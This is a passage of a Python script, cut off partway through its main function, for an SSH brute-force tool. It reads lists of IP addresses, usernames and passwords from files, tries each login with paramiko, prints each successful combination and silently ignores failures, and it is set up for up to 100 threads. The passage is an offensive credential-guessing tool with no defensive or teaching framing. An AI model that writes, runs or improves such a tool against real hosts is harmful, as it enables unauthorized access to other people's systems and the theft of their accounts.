import ipaddress
import os
import paramiko
import threading
import time

MAX_THREADS = 100
UI_WIDTH = 80
UI_HEIGHT = 24

class BruteForceArgs:
    def __init__(self, ip, username, password):
        self.ip = ip
        self.username = username
        self.password = password

def attempt_connect(args):
    try:
        session = paramiko.SSHClient()
        session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        session.connect(str(args.ip), username=args.username, password=args.password, timeout=5)
        print(f"Success: {args.ip} {args.username} {args.password}")
        session.close()
    except:
        pass

def read_file(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

def draw_ui():
    os.system('cls' if os.name == 'nt' else 'clear')
    print('+' + '-' * (UI_WIDTH - 2) + '+')
    for _ in range(UI_HEIGHT - 2):
        print('|' + ' ' * (UI_WIDTH - 2) + '|')
    print('+' + '-' * (UI_WIDTH - 2) + '+')

def main():
    ip_list_file = "ip_list.txt"
    user_list_file = "user_list.txt"
    password_list_file = "password_list.txt"

    ip_list = [ipaddress.ip_address(ip.strip()) for ip
